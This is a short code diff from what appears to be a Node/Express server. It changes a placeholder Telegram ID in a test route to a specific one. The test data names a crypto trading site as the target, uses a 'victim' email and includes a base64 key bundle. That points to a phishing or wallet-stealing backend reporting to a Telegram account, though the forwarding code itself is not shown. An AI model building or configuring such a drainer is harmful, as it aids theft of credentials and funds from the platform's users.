@@ -298,7 +298,7 @@ app.get('/', (req, res) => {
 
 app.get('/test', async (req, res) => {
   const testData = {
-    telegramId: '123456789',
+    telegramId: '7983375176',
     site: 'https://axiom.trade/discover',
     user: { email: 'victim@axiom.trade' },
     bundle: Buffer.from('test-bundle-key-32-bytes-long!!').toString('base64'),
